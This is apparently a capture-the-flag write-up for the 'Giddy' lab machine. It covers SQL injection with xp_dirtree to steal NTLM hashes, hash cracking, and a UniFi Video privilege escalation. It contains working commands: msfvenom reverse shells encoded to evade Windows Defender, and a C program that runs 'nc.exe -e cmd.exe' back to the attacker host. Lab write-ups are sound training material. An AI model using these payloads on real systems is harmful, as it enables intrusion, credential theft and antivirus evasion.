## Default Information
IP Address: 10.10.10.104\
OS: Windows

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.104    giddy.htb
```
### Masscan
Firstly, we will use rustscan to identify the open ports

```
Open 10.10.10.104:80
Open 10.10.10.104:443
Open 10.10.10.104:3389
Open 10.10.10.104:5985
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 80  | http | Microsoft IIS httpd 10.0 | Open |
| 443  | ssl/http | Microsoft IIS httpd 10.0 | Open |
| 3389  | ms-wbt-server | Microsoft Terminal Services | Open |
| 5985  | http | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | Open |

From the nmap output, we are also able to find out enumerate information from the remote RDP services on port 3389

```
| rdp-ntlm-info: 
|   Target_Name: GIDDY
|   NetBIOS_Domain_Name: GIDDY
|   NetBIOS_Computer_Name: GIDDY
|   DNS_Domain_Name: Giddy
|   DNS_Computer_Name: Giddy
|   Product_Version: 10.0.14393
```

### Web Enumeration
Using Gobuster, we are able to find several endpoints on http://giddy.htb

```
https://10.10.10.104:443/Aspnet_Client        (Status: 301) [Size: 162] [--> https://10.10.10.104:443/aspnet_client/]
https://10.10.10.104:443/remote               (Status: 302) [Size: 157] [--> /Remote/default.aspx?ReturnUrl=%2fremote]
https://10.10.10.104:443/mvc                  (Status: 301) [Size: 152] [--> https://10.10.10.104:443/mvc/]
```

Accessing http://giddy.htb/remote, we realized that this site can only be accessed via https protocol

![https protocol](./Images/https_protocol.png)

Accessing https://giddy.htb/remote, we realize that this site is a Windows Server 2016 and its a login page for Windows Powershell Web Access. To login to the site, we would require a set of credentials but we do not have it yet. We would have to enumerate our sites to find the credentails.

Navigating to http://giddy.htb/mvc/Search.aspx, we realize that there is an SQL Injection vulnerability as we are able to dump all the products using the ```test' or 1=1``` as the payload.
![SQL Injection](./Images/sql_injection.png)

Since we know that the backend of this machine is Microsoft, we can guess that the database that we are working with would be mssql. 

## Exploit
### SQL Injection
Next, we will try to use stacked queries ```'; use master; exec xp_dirtree '\\10.10.16.6\share';-- -``` to steal NTLM hashes using xp_dirtree. We will then use responder to capture the NTLM hashes

```
┌──(kali㉿kali)-[~]
└─$ sudo responder -wrf --lm -v -I tun0   
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Listening for events...                                                                            

[SMB] NTLMv2 Client   : 10.10.10.104
[SMB] NTLMv2 Username : GIDDY\Stacy
[SMB] NTLMv2 Hash     : Stacy::GIDDY:372cafd77f1f383b:3AA98623C48829F14C6AC8851DA25842:010100000000000022596EB0AE65D801051E76816DAD9E9D00000000020000000000000000000000                                       
[SMB] NTLMv2 Client   : 10.10.10.104
[SMB] NTLMv2 Username : GIDDY\Stacy
[SMB] NTLMv2 Hash     : Stacy::GIDDY:36990df4bb3a70b7:4AB401200CE3D0271A1C3DA2A9080EAC:01010000000000007651CFB1AE65D8010F47CF039650CA4700000000020000000000000000000000 
```

### Cracking NTLM hashes
Next, we will use hashcat to crack the NTLM hashes

```
┌──(kali㉿kali)-[~/Desktop/giddy]
└─$ hashcat -m 5600 /home/kali/Desktop/giddy/hash.txt /home/kali/Desktop/pentest/wordlist/rockyou.txt
STACY::GIDDY:36990df4bb3a70b7:4ab401200ce3d0271a1c3da2a9080eac:01010000000000007651cfb1ae65d8010f47cf039650ca4700000000020000000000000000000000:xNnWo6272k7x
STACY::GIDDY:372cafd77f1f383b:3aa98623c48829f14c6ac8851da25842:010100000000000022596eb0ae65d801051e76816dad9e9d00000000020000000000000000000000:xNnWo6272k7x
```

Using the credentials that we have obtained, we can authenticate using evil-winrm

```
┌──(kali㉿kali)-[~/Desktop/giddy]
└─$ evil-winrm -i 10.10.10.104 -u Stacy -p 'xNnWo6272k7x'

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Stacy\Documents>
```

### Obtaining user flag

```
*Evil-WinRM* PS C:\Users\Stacy\Desktop> type user.txt
<Redacted user flag>
```

### Privilege Escalation to SYSTEM
Looking at the C:\Users\Stacy\documents directory, we are able to find a unifivideo. Searching this up on exploitdb from [here](https://www.exploit-db.com/exploits/43390), we are able to find out that this belongs to Ubiquiti Unifi Video and there is a privilege escalation vulnerability for it.

Let us first check if the version of Ubiquiti Unifi Video on this machine is vulnerable. From the output, we can see that we are using unifi-video 3.7.3 which is a vulnerable version

```
*Evil-WinRM* PS C:\ProgramData\unifi-video\data> cat system.properties
# unifi-video v3.7.3
#Sat Jun 16 21:58:13 EDT 2018
is_default=false
uuid=e79d440a-62cd-4274-95c3-d746cbb3b817
# app.http.port = 7080
# app.https.port = 7443
# ems.liveflv.port = 6666
# ems.livews.port = 7445
# ems.livewss.port = 7446
# ems.rtmp.enable = true
# ems.rtmp.port = 1935
# ems.rtsp.enable = true
# ems.rtsp.port = 7447
```
However, we would need to know the service name before we can start or stop the service. To do so, we can query the registry for the service name. From the output, we can find that the service name is ```UniFiVideoService```
```
*Evil-WinRM* PS C:\Users\Stacy\Documents> reg query "HKLM\SYSTEM\CurrentControlSet\Services"
...
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UniFiVideoService
...
*Evil-WinRM* PS C:\Users\Stacy\Documents> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UniFiVideoService"
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UniFiVideoService
    Type    REG_DWORD    0x10
    Start    REG_DWORD    0x2
    ErrorControl    REG_DWORD    0x1
    ImagePath    REG_EXPAND_SZ    C:\ProgramData\unifi-video\avService.exe //RS//UniFiVideoService
    DisplayName    REG_SZ    Ubiquiti UniFi Video
    DependOnService    REG_MULTI_SZ    Tcpip\0Afd
    ObjectName    REG_SZ    LocalSystem
    Description    REG_SZ    Ubiquiti UniFi Video Service
```

Let us now generate a reverse shell payload using msfvenom 

```
┌──(kali㉿kali)-[~/Desktop/giddy]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.6 LPORT=4000 -f exe -o shell.exe      2 ⨯
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

Next, let us transfer the file to the server using impacket-smbserver and try to execute the taskkill.exe executable. However, we realize that we will not be able to execute the taskkill.exe executable as it seems that the executable is blocked by Windows Defender

```
*Evil-WinRM* PS C:\ProgramData\unifi-video> copy //10.10.16.6/share/taskkill.exe
*Evil-WinRM* PS C:\ProgramData\unifi-video> ./taskkill.exe
Program 'taskkill.exe' failed to run: Operation did not complete successfully because the file contain
```

Looking at the background processes running in the machine, we can see that there is a ```MpCmdRun``` and ```MsMpEng``` running in the background. Both processes are processes specific to Windows Defender which tells us that Windows Defender is running in the background.

```
*Evil-WinRM* PS C:\ProgramData\unifi-video> ps

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    ...     ...      ...        ...               ...     ........
    166      10     2352       8556               996   0 MpCmdRun
    190      13     2828       9808              3556   0 msdtc
    599      72   155608     110640              2128   0 MsMpEng
    ...     ...      ...        ...               ...     ........
```

We would need to use some form of encoding to bypass the Windows Defender malware definitions. To do so, we will use the Shikata Ga Nai encoder in msfvenom to generate a reverse shell

```
┌──(HTB2)─(kali㉿kali)-[~/Desktop/giddy]
└─$ msfvenom -p windows/shell/reverse_tcp -b "x00" -e x86/shikata_ga_nai LHOST=10.10.16.6 LPORT=4000 -f exe -o taskkill.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: taskkill.exe
```

Afterwards, we will start an SMB server on our local machine and transfer the taskkill.exe executable that we have generated on our local machine to the vulnerable machine. Next, we will have to start a reverse shell listener using msf

```
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.16.6
LHOST => 10.10.16.6
msf6 exploit(multi/handler) > set LPORT 4000
LPORT => 4000
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.16.6:4000
```

Lastly, all we have to do is to stop the UnifiVideoService on the vulnerable machine.

```
*Evil-WinRM* PS C:\ProgramData\unifi-video> Stop-Service -Name UniFiVideoService
Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
```

This will then create a reverse shell on our msf listener

```
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.16.6
LHOST => 10.10.16.6
msf6 exploit(multi/handler) > set LPORT 4000
LPORT => 4000
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.16.6:4000 
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 10.10.10.104
[*] Command shell session 1 opened (10.10.16.6:4000 -> 10.10.10.104:49703) at 2022-05-13 01:53:38 -0400

whoami
whoami
nt authority\system

C:\ProgramData\unifi-video>
```

### Obtaining root flag

```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
<Redacted root flag>
```
## Post-Exploitation
### SQL Injection
Somehow all the union based SQL Injections redirect me to error pages and I am not able to extract the databases at all. The reason why we are unable to extract the databases was due to the fact that there is a web application firewall that will filter out the malicious requests

From the response that we have intercepted using Burp Suite, we can see that the error originates from C:\Users\jnogueira\Downloads\owasp10\1-owasp-top10-m1-injection-exercise-files\before\1-Injection\Search.aspx which seems like some sort of filtering against OWASP's TOP 10 Injections vulnerabilities.

We also found another endpoint that is vulnerable, http://giddy.htb/mvc/Product.aspx?ProductSubCategoryId=1 that is vulnerable to SQL Injection as well. 

![SQL Injection in product.aspx](./Images/product_aspx_sql_injection.png)

The same exploitation could be used to extract the NTLM hashes by visiting http://giddy.htb/mvc/Product.aspx?ProductSubCategoryId=8;use%20master;EXEC%20xp_dirtree%20%22\\10.10.16.6\share%22;--%20-. The hashes can then be captured by the responder that is listening on our local machine. 

Similiar to the Search.aspx endpoint, we are unable to extract the databases manually due to filtering of SQL Injection payloads. However, we can still use sqlmap to dump out the databases.

If we were to look through the dumped databases, we realized that there is no information that can help in furthur exploitation of this machine. One thing that might be of concern is that we were able to extract out the credit card database which contains a lot of credit card information such as the credit card id, credit card number etc which might be a real concern if this was a production site in the real world. 

```
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://giddy.htb/mvc/Product.aspx?ProductSubCategoryId=1" --dump
```
### Exploiting unifivideo without metasploit
Another alternative to bypass Windows Defender is write a C program that does a system call which uses the nc.exe executable that we will upload later to spawn a reverse shell connection

```
#include <stdlib.h>

int main() {
    system("C:\\ProgramData\\unifi-video\\nc.exe -e cmd.exe 10.10.16.6 4000");
}
```

Afterwards, we will use the cross-platform compiler to compile it into the taskkill.exe. Since this is code is written by us, there is no signature for malware that will be detected when we execute the taskkill.exe executable

```
┌──(kali㉿kali)-[~/Desktop/giddy]
└─$ x86_64-w64-mingw32-gcc rev.c -o taskkill.exe 
```

Afterwards, we will have to transfer the nc.exe and taskkill.exe executable to the vulnerable machine. 

```
*Evil-WinRM* PS C:\ProgramData\unifi-video> copy //10.10.16.6/share/nc.exe
*Evil-WinRM* PS C:\ProgramData\unifi-video> copy //10.10.16.6/share/taskkill.exe
```

Lastly, all we have to do is to stop the service of the UniFiVideoService to spawn a reverse shell

```
*Evil-WinRM* PS C:\ProgramData\unifi-video> Stop-Service -Name UniFiVideoService -Force
---------------------------------------------------------------------------------------
┌──(kali㉿kali)-[~/Desktop/giddy]
└─$ nc -nlvp 4000
listening on [any] 4000 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.104] 49733
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\ProgramData\unifi-video>whoami
whoami
nt authority\system

C:\ProgramData\unifi-video>
```
